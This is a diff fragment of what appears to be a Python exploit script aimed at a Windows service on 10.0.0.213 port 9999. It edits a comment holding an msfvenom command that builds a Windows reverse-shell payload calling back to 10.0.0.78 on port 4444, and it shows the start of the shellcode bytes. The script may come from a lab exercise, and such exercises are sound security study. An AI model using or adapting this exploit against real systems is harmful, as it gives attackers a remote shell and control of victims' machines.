@@ -9,7 +9,7 @@ import socket
 victim_host = '10.0.0.213'
 victim_port = 9999
 
-# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.78 LPORT=4444 -b "\x00" -v shellcode -f c -f python
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.78 LPORT=4444 -b "\x00" -v shellcode -f python
 
 shellcode =  "" 
 shellcode += "\xbb\xe8\x37\x7b\xfa\xda\xd1\xd9\x74\x24\xf4\x5a"
